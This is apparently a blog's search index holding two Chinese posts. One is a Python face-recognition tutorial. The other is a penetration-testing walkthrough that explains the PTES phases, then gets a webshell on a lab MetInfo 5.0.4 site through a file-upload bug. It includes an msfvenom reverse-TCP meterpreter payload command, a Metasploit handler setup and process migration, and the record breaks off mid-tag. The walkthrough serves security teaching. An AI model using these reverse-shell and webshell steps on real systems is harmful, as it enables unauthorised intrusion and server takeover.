<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>人脸识别的简要介绍</title>
      <link href="/aisnnu.github.io/uncategorized/aisnnu4/"/>
      <url>/aisnnu.github.io/uncategorized/aisnnu4/</url>
      
        <content type="html"><![CDATA[<p>你是否意识到，每当你上传照片到Facebook上，平台都会用人脸识别算法来识别图片中的人物？目前还有一些政府在用人脸识别技术来识别和抓捕罪犯。此外，最常见的应用就是通过自己的脸部解锁手机。</p><a id="more"></a><p>计算机视觉的子领域应用得非常广泛，并且全球很多商业活动都已经从中获益。人脸识别模型的使用在接下来的几年内还会继续增长，所以一起来了解如何从零开始构建人脸识别模型吧！</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu4/1.png" alt=""></p><p>本文首先会介绍人脸识别模型的内部工作原理。随后结合一个简单的案例，我们将通过Python进行案例实践。在本文的最后部分，你将完成你的第一个人脸识别模型！</p><h1 id="理解人脸识别的工作原理"><a href="#理解人脸识别的工作原理" class="headerlink" title="理解人脸识别的工作原理"></a>理解人脸识别的工作原理</h1><p>为了理解人脸识别算法工作原理，我们首先来了解一下特征向量的概念。（译者注：此处的特征向量指机器学习的概念，不同于矩阵理论。）</p><p>每个机器学习算法都会将数据集作为输入，并从中学习经验。算法会遍历数据并识别数据中的模式。例如，假定我们希望识别指定图片中人物的脸，很多物体是可以看作模式的：</p><p>脸部的长度/宽度。</p><p>由于图片比例会被调整，长度和高度可能并不可靠。然而，在放缩图片后，比例是保持不变的——脸部长度和宽度的比例不会改变。</p><p>脸部肤色。</p><p>脸上局部细节的宽度，如嘴，鼻子等。</p><p>显而易见，此时存在一个模式——不同的脸有不同的维度，相似的脸有相似的维度。有挑战性的是需要将特定的脸转为数字，因为机器学习算法只能理解数字。表示一张脸的数字（或训练集中的一个元素）可以称为特征向量。一个特征向量包括特定顺序的各种数字。</p><p>举一个简单的例子，我们可以将一张脸映射到一个特征向量上。特征向量由不同的特征组成，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">脸的长度（cm）</span><br><span class="line"></span><br><span class="line">脸的宽度（cm）</span><br><span class="line"></span><br><span class="line">脸的平均肤色（R，G，B）</span><br><span class="line"></span><br><span class="line">唇部宽度（cm）</span><br><span class="line"></span><br><span class="line">鼻子长度（cm）</span><br></pre></td></tr></table></figure></p><p>当给定一个图片时，我们可以标注不同的特征并将其转化为如下的特征向量：</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu4/2.png" alt=""></p><p>如此一来，我们的图片现在被转化为一个向量，可以表示为(23.1,15.8,255,224,189,5.2,4.4)。当然我们还可以从图片中衍生出无数的其他特征（如，头发颜色，胡须，眼镜等）。然而在这个简单的例子中，我们只考虑这五个简单的特征。</p><p>现在，一旦我们将每个图片解码为特征向量，问题就变得更简单。明显地，当我们使用同一个人的两张面部图片时，提取的特征向量会非常相似。换言之，两个特征向量的“距离”就变得非常小。</p><p>此时机器学习可以帮我们完成两件事：</p><p>提取特征向量。由于特征过多，手动列出所有特征是非常困难的。一个机器学习算法可以自动标注很多特征。例如，一个复杂的特征可能是：鼻子长度和前额宽度的比例。手动列出所有的这些衍生特征是非常困难的。</p><p>匹配算法：一旦得到特征向量，机器学习算法需要将新图片和语料库中的特征向量进行匹配。</p><p>既然我们对人脸识别如何工作有了基本的理解，让我们运用一些广泛使用的Python库来搭建自己的人脸识别算法。</p><h1 id="案例学习"><a href="#案例学习" class="headerlink" title="案例学习"></a>案例学习</h1><p>首先给定一些人物脸部的图片——可能是一些名人，如Mark Zuckerberg, Warren Buffett, Bill Gates, Shah Rukh Khan等，并把这些人脸看作我们的语料库。现在，我们给定一些其他名人的新图片（“新人物”），并判断这些“新人物”是否在语料库中。</p><p>以下是语料库中的图片：</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu4/3.png" alt=""></p><p>如图所示，我们所列举的名人有Barack Obama, Bill Gates, Jeff Bezos, Mark Zuckerberg, Ray Dalio 和Shah Rukh Khan。</p><p>现在，假定“新人物”如下：</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu4/4.png" alt=""></p><p>注：以上所有图片均来自Google图片。</p><p>显而易见，这是Shah Rukh Khan。然而对电脑来说，这个任务很有挑战性。因为对于我们来说，我们可以轻易地将图片的多种特征结合来判断这是哪个人物。然而对电脑而言，学习如何识别人脸是非常不直观的。</p><p>有一个神奇但是简单的python库封装了以上提及的内容——可以根据脸部特征生成特征向量并且知道如何区分不同的脸。这个python库叫做face_recognition。它应用了dlib——一个现代C++工具包，其中包含了一些机器学习算法来帮助完成复杂的基于C++的应用。</p><p>Python中的face_recognition库可以完成大量的任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">发现给定图片中所有的脸。</span><br><span class="line"></span><br><span class="line">发现并处理图片中的脸部特征。</span><br><span class="line"></span><br><span class="line">识别图片中的脸。</span><br><span class="line"></span><br><span class="line">实时的人脸识别。</span><br></pre></td></tr></table></figure><p>接下来，我们将探讨其中的第三种任务——识别图片中的脸。</p><p>你可以在github的如下链接中获取face_recognition库的源代码。</p><p>附链接：</p><p><a href="https://github.com/ageitgey/face_recognition" target="_blank" rel="noopener">https://github.com/ageitgey/face_recognition</a></p><p>事实上，这里有一些如何安装face_recognition库的指导。</p><p>附链接：</p><p><a href="https://github.com/ageitgey/face_recognition#installation-options" target="_blank" rel="noopener">https://github.com/ageitgey/face_recognition#installation-options</a></p><p>在你安装face_recognition之前，还需要安装dlib包。你可以从如下链接中找到安装dlib的指导。</p><p>附链接：</p><p><a href="https://gist.github.com/ageitgey/629d75c1baac34dfa5ca2a1928a7aeaf" target="_blank" rel="noopener">https://gist.github.com/ageitgey/629d75c1baac34dfa5ca2a1928a7aeaf</a> </p><h1 id="Python应用"><a href="#Python应用" class="headerlink" title="Python应用"></a>Python应用</h1><p>这部分包括使用face_recognition库搭建简单人脸识别系统的代码。这是一个应用操作的部分，我们将在下一部分解读代码来理解更多细节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># import the libraries</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">import face_recognition</span><br><span class="line"></span><br><span class="line"># make a list of all the available images</span><br><span class="line"></span><br><span class="line">images = os.listdir(&apos;images&apos;)</span><br><span class="line"></span><br><span class="line"># load your image</span><br><span class="line"></span><br><span class="line">image_to_be_matched = face_recognition.load_image_file(&apos;my_image.jpg&apos;)</span><br><span class="line"></span><br><span class="line"># encoded the loaded image into a feature vector</span><br><span class="line"></span><br><span class="line">image_to_be_matched_encoded = face_recognition.face_encodings(</span><br><span class="line"></span><br><span class="line">    image_to_be_matched)[0]</span><br><span class="line"></span><br><span class="line"># iterate over each image</span><br><span class="line"></span><br><span class="line">for image in images:</span><br><span class="line"></span><br><span class="line">    # load the image</span><br><span class="line"></span><br><span class="line">    current_image = face_recognition.load_image_file(&quot;images/&quot; + image)</span><br><span class="line"></span><br><span class="line">    # encode the loaded image into a feature vector</span><br><span class="line"></span><br><span class="line">    current_image_encoded = face_recognition.face_encodings(current_image)[0]</span><br><span class="line"></span><br><span class="line">    # match your image with the image and check if it matches</span><br><span class="line"></span><br><span class="line">    result = face_recognition.compare_faces(</span><br><span class="line"></span><br><span class="line">        [image_to_be_matched_encoded], current_image_encoded)</span><br><span class="line"></span><br><span class="line">    # check if it was a match</span><br><span class="line"></span><br><span class="line">    if result[0] == True:</span><br><span class="line"></span><br><span class="line">        print &quot;Matched: &quot; + image</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        print &quot;Not matched: &quot; + image</span><br></pre></td></tr></table></figure><p>文件结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">facialrecognition:</span><br><span class="line"></span><br><span class="line">fr.py</span><br><span class="line"></span><br><span class="line">my_image.jpg</span><br><span class="line"></span><br><span class="line">images/</span><br><span class="line"></span><br><span class="line">barack_obama.jpg</span><br><span class="line"></span><br><span class="line">bill_gates.jpg</span><br><span class="line"></span><br><span class="line">jeff_bezos.jpg</span><br><span class="line"></span><br><span class="line">mark_zuckerberg.jpg</span><br><span class="line"></span><br><span class="line">ray_dalio.jpg</span><br><span class="line"></span><br><span class="line">shah_rukh_khan.jpg</span><br><span class="line"></span><br><span class="line">warren_buffett.jpg</span><br></pre></td></tr></table></figure><p>我们的根目录，facialrecognition包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fr.py的形式的人脸识别代码。</span><br><span class="line"></span><br><span class="line">my_image.jpg – 即将被识别的图片(“新人物”)。</span><br><span class="line"></span><br><span class="line">images/ – 语料库。</span><br></pre></td></tr></table></figure><p>如果你按照前文创建文件结构并执行代码，如下是你能得到的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Matched: shah_rukh_khan.jpg</span><br><span class="line"></span><br><span class="line">Not matched: warren_buffett.jpg</span><br><span class="line"></span><br><span class="line">Not matched: barack_obama.jpg</span><br><span class="line"></span><br><span class="line">Not matched: ray_dalio.jpg</span><br><span class="line"></span><br><span class="line">Not matched: bill_gates.jpg</span><br><span class="line"></span><br><span class="line">Not matched: jeff_bezos.jpg</span><br><span class="line"></span><br><span class="line">Not matched: mark_zuckerberg.jpg</span><br></pre></td></tr></table></figure><p>显而易见，新名人是Shah Rukh Khan 并且我们的人脸识别系统可以识别!</p><h1 id="理解Python代码"><a href="#理解Python代码" class="headerlink" title="理解Python代码"></a>理解Python代码</h1><p>现在让我们解读代码来，并理解其工作原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># import the libraries</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">import face_recognition</span><br></pre></td></tr></table></figure><p>以上是引入操作。我们将通过已经建好的os库来读入语料库中的所有图片，并且通过face_recognition来完成算法部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># make a list of all the available images</span><br><span class="line"></span><br><span class="line">images = os.listdir(&apos;images&apos;)</span><br></pre></td></tr></table></figure><p>这个简单的代码将帮助我们识别语料库中所有图片的路径。一旦执行这些代码，我们可以得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">images = [&apos;shah_rukh_khan.jpg&apos;, &apos;warren_buffett.jpg&apos;, &apos;barack_obama.jpg&apos;, &apos;ray_dalio.jpg&apos;, &apos;bill_gates.jpg&apos;, &apos;jeff_bezos.jpg&apos;, &apos;mark_zuckerberg.jpg&apos;]</span><br></pre></td></tr></table></figure><p>现在，以下代码将加载新人物的图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># load your image</span><br><span class="line"></span><br><span class="line">image_to_be_matched = face_recognition.load_image_file(&apos;my_image.jpg&apos;)</span><br></pre></td></tr></table></figure><p>为了保证算法可以解析图片，我们将人物脸部图片转化为特征向量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># encoded the loaded image into a feature vector</span><br><span class="line"></span><br><span class="line">image_to_be_matched_encoded = face_recognition.face_encodings(</span><br><span class="line"></span><br><span class="line">    image_to_be_matched)[0]</span><br></pre></td></tr></table></figure><p>剩余的代码相对简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># iterate over each image</span><br><span class="line"></span><br><span class="line">for image in images:</span><br><span class="line"></span><br><span class="line">    # load the image</span><br><span class="line"></span><br><span class="line">    current_image = face_recognition.load_image_file(&quot;images/&quot; + image)</span><br><span class="line"></span><br><span class="line">    # encode the loaded image into a feature vector</span><br><span class="line"></span><br><span class="line">    current_image_encoded = face_recognition.face_encodings(current_image)[0]</span><br><span class="line"></span><br><span class="line">    # match your image with the image and check if it matches</span><br><span class="line"></span><br><span class="line">    result = face_recognition.compare_faces(</span><br><span class="line"></span><br><span class="line">        [image_to_be_matched_encoded], current_image_encoded)</span><br><span class="line"></span><br><span class="line">    # check if it was a match</span><br><span class="line"></span><br><span class="line">    if result[0] == True:</span><br><span class="line"></span><br><span class="line">        print &quot;Matched: &quot; + image</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        print &quot;Not matched: &quot; + image</span><br></pre></td></tr></table></figure><p>此时，我们：</p><p>对每个图像进行循环操作。</p><p>将图像解析为特征向量。</p><p>比较语料库中已经加载的图片和被识别的新人物图片。</p><p>如果两者匹配，我们就显示出来。如果不匹配，我们也要显示结果。</p><p>如上所示，结果显示这个简单的人脸识别算法进行得很顺利。让我们尝试将my_image替换为另一个图片：</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu4/5.png" alt=""></p><p>当你再次运行这个算法，将会看到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Not matched: shah_rukh_khan.jpg</span><br><span class="line"></span><br><span class="line">Not matched: warren_buffett.jpg</span><br><span class="line"></span><br><span class="line">Not matched: barack_obama.jpg</span><br><span class="line"></span><br><span class="line">Not matched: ray_dalio.jpg</span><br><span class="line"></span><br><span class="line">Not matched: bill_gates.jpg</span><br><span class="line"></span><br><span class="line">Not matched: jeff_bezos.jpg</span><br><span class="line"></span><br><span class="line">Not matched: mark_zuckerberg.jpg</span><br></pre></td></tr></table></figure><p>很明显，系统没有将马云识别为以上的任何一个名人。这意味着我们的算法在以下方面都表现得很好：</p><p>正确地识别那些在语料库中存储的人。</p><p>对语料库中不存在的人物进行标注。</p><p>人脸识别算法的应用</p><p>人脸识别是一个成熟的研究方向，已被广泛地应用在工业界和学术界。例如，一个罪犯在中国被捕可能就得益于人脸识别系统：系统识别了他的脸并发出警报。由此可见，面部识别可以用来减少犯罪。还有许多其他有趣的人脸识别案例:</p><p>面部身份验证：Apple在iPhones中引入了Face ID以用于面部身份验证。一些银行也尝试使用面部身份验证来解锁。</p><p>用户服务：马来西亚的一些银行安装了新的人脸识别系统，用于识别有价值的银行客户，以便银行为其提供个人服务。进而银行可以通过维持这类用户并提升用户满意度来获取更多收益。</p><p>保险行业：很多保险公司正在通过运用人脸识别系统来匹配人的脸和ID提供的照片，使赔付过程变得更简单。</p><h1 id="尾记"><a href="#尾记" class="headerlink" title="尾记"></a>尾记</h1><p>综上所述，人脸识别是一个有趣的问题并且有很多强大的案例。这些应用可以有效地从各个方面为社会服务。尽管将这些技术商业化可能会带来伦理风险。</p><p>原文链接：</p><p><a href="https://www.analyticsvidhya.com/blog/2018/08/a-simple-introduction-to-facial-recognition-with-python-codes/" target="_blank" rel="noopener">https://www.analyticsvidhya.com/blog/2018/08/a-simple-introduction-to-facial-recognition-with-python-codes/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透攻击_如何取得一台服务器的控制权限</title>
      <link href="/aisnnu.github.io/uncategorized/aisnnu3/"/>
      <url>/aisnnu.github.io/uncategorized/aisnnu3/</url>
      
        <content type="html"><![CDATA[<p>渗透测试就是一种通过模拟恶意攻击者的技术和方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方法。</p><a id="more"></a><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与响应过程中的操作性弱点等。而这一过程需要以攻击者的角度进行实施，通常涉及对大量发现安全漏洞的主动渗透与入侵攻击。渗透测试中发现的所有安全问题，他们所带来的业务影响后果评估，以及如何避免这些问题的技术解决方案，将最终报告中呈现给目标系统的拥有者，帮助他们修补并提升系统的安全性。</p><h1 id="渗透测试的种类"><a href="#渗透测试的种类" class="headerlink" title="渗透测试的种类"></a>渗透测试的种类</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>渗透测试团队将从一个远程网络位置来评估目标网络基础设施，并没有任何目标网络内部拓扑等相关信息，他们完全模拟真实网络环境中的攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标进行逐步地渗透与入侵，揭示目标网络中一些已知或未知的安全漏洞，并评估这些漏洞能否被利用获取控制权或造成业务资产的损失。</p><p>黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。</p><p>黑盒测试是比较费时费力的，同时需要渗透测试者具备较高的技术能力。</p><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><p>进行白盒测试的团队将可以了解到关于目标环境的所有内部与底层知识，因此这可以让渗透测试者以最小的代价发现和验证系统中最严重的安全漏洞。如果实施到位，白盒测试能够比黑盒测试消除更多的目标基础设施环境中的安全漏洞和弱点。</p><p>白盒测试无须进行目标定位和情报搜集。</p><p>白盒测试能够更加方便的在一次常规的开发与部署计划周期中集成。</p><p>白盒测试中发现和解决安全漏洞所需花费的时间和代价要比黑盒测试少许多。</p><p>白盒测试无法有效地测试客户组织的应急响应措施，也无法判断出他们的安全防护计划对检测特定攻击的效率。</p><h1 id="渗透测试方法论-PTES"><a href="#渗透测试方法论-PTES" class="headerlink" title="渗透测试方法论-PTES"></a>渗透测试方法论-PTES</h1><p>PTES 渗透测试执行标准是由安全业界多家领军企业技术专家所共同发起的，期望为企业组织与安全服务提供商设计并制定用来实施渗透测试的通用准则。</p><p>PTES 标准项目网站为<code>http://www.pentest-standard.org</code></p><p>PTES 标准中定义的渗透测试过程环节基本上反映了安全业界的普遍认同，具体包括以下7个阶段。</p><h2 id="前期交互阶段（Pre-Engagement-Interaction）"><a href="#前期交互阶段（Pre-Engagement-Interaction）" class="headerlink" title="前期交互阶段（Pre-Engagement Interaction）"></a>前期交互阶段（Pre-Engagement Interaction）</h2><p>在前期交互阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。</p><p>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h2 id="情报搜集阶段（Information-Gathering）"><a href="#情报搜集阶段（Information-Gathering）" class="headerlink" title="情报搜集阶段（Information Gathering）"></a>情报搜集阶段（Information Gathering）</h2><p>渗透测试团队可以利用各种信息来源于搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。</p><p>收集信息的方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。</p><h2 id="威胁建模阶段（Threat-Modeling）"><a href="#威胁建模阶段（Threat-Modeling）" class="headerlink" title="威胁建模阶段（Threat Modeling）"></a>威胁建模阶段（Threat Modeling）</h2><p>针对获取的信息进行威胁建模与攻击规划。通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息中理清头绪，切丁最可行的攻击通道。</p><h2 id="漏洞分析阶段（Vulnerability-Analysis）"><a href="#漏洞分析阶段（Vulnerability-Analysis）" class="headerlink" title="漏洞分析阶段（Vulnerability Analysis）"></a>漏洞分析阶段（Vulnerability Analysis）</h2><p>在确定出最可行的攻击通道之后，接下来需要考虑该如何获取目标系统的访问控制权。</p><p>渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。</p><p>在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些管家你系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h2 id="渗透攻击阶段（Exploitation）"><a href="#渗透攻击阶段（Exploitation）" class="headerlink" title="渗透攻击阶段（Exploitation）"></a>渗透攻击阶段（Exploitation）</h2><p>在此环节中，渗透测试团队需要利用它们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。</p><p>渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。</p><p>在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。</p><h2 id="后渗透攻击阶段（Post-Exploitation）"><a href="#后渗透攻击阶段（Post-Exploitation）" class="headerlink" title="后渗透攻击阶段（Post Exploitation）"></a>后渗透攻击阶段（Post Exploitation）</h2><p>在这个环节中，需要渗透测试团队根据目标的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户最具价值的尝试安全防护的信息和资产，最终达成能够对客户造成最重要业务影响的攻击途径</p><p>后渗透攻击的目标和途径是千变万化的。</p><h2 id="报告阶段（Reporting）"><a href="#报告阶段（Reporting）" class="headerlink" title="报告阶段（Reporting）"></a>报告阶段（Reporting）</h2><p>渗透测试过程最终需要向客户提交，取得认可并成功获得合同付款就是一份渗透测试报告。</p><p>这份报告凝聚了之前所有阶段之中渗透测试团队所获取的管家你情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题以及修补与升级方案。</p><h1 id="实战：后渗透攻击"><a href="#实战：后渗透攻击" class="headerlink" title="实战：后渗透攻击"></a>实战：后渗透攻击</h1><h2 id="目标网站"><a href="#目标网站" class="headerlink" title="目标网站"></a>目标网站</h2><p>使用浏览器打开测试站点<code>http://www.test.com</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/1.png" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="IP-收集"><a href="#IP-收集" class="headerlink" title="IP 收集"></a>IP 收集</h3><p>使用ping 命令初步判定ip 地址为10.10.10.201，但是显示请求超时，目标网站可能有防火墙设置。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/2.png" alt=""></p><h3 id="网站技术架构识别"><a href="#网站技术架构识别" class="headerlink" title="网站技术架构识别"></a>网站技术架构识别</h3><p>根据HTTP 报文的响应头部，可以初步判断网站技术架构。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/3.png" alt=""></p><p>通过浏览网站信息，发现该网站使用meinfo，并且他的版本号码是5.0.4。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/4.png" alt=""></p><h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>metinfov5.0.4 存在文件上传漏洞，可以直接使用提前写好的脚本GetShell。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/5.png" alt=""></p><p>Shell 地址为<code>http://www.test.com/upload/file/1544783891.php</code>  输入密码[admin]，即可进入大马。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/6.png" alt=""></p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透就是就是扩大渗透攻击的深度与广度。其中涉及到目标系统重要资产发现，权限提升，维持访问等等操作。</p><h3 id="查看开放的端口"><a href="#查看开放的端口" class="headerlink" title="查看开放的端口"></a>查看开放的端口</h3><p>发现Web 服务器上开放的端口如下</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/7.png" alt=""></p><p>经过简单判断，得到如下信息</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/8.png" alt=""></p><h3 id="用户账户信息"><a href="#用户账户信息" class="headerlink" title="用户账户信息"></a>用户账户信息</h3><p>查看所有账户</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/9.png" alt=""></p><p>在这里，我们可以创建一个用户并加入到管理员组，但是我个人觉得意义不大。</p><h3 id="查看IP-地址"><a href="#查看IP-地址" class="headerlink" title="查看IP 地址"></a>查看IP 地址</h3><p>在WebShell 中，查看IP 地址发现是[192.168.1.100]，这跟域名解析出来的地址不同。说明Web 服务器有可能在内网中。并且网关是[192.168.1.254]。<br><img src="/aisnnu.github.io/uncategorized/aisnnu3/10.png" alt=""></p><p>这里面我们是没有办法与192.168.1.100 直接进行通信的。我们尝试一下内网能否访问我们。嗯，可以访问，问题不大。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/11.png" alt=""></p><p>我们可以尝试反弹Shell ，并且使用强大的后渗透工具–Meterpreter。</p><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>制作反弹Shell exe 文件</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.197 LPORT=4444 -f exe -o payload.exe</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/12.png" alt=""></p><h3 id="配置MSF"><a href="#配置MSF" class="headerlink" title="配置MSF"></a>配置MSF</h3><p>具体命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 10.10.10.197 </span><br><span class="line">LHOST =&gt; 10.10.10.197</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></p><p>将生成的payload.exe 文件直接上传到目标服务器，直接运行，就可以得到Meterpreter 会话。此时我们的后渗透攻击之旅，才刚刚开始。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/13.png" alt=""></p><p>这个Meterpreter 会话的ID 是1 ，这个是由payload.exe 文件反弹回来的Shell，如果进程结束，会丢失该会话。</p><h3 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h3><p> <code>ps查看系统进程</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/14.png" alt=""></p><p> <code>migrate 3724</code></p><p><img 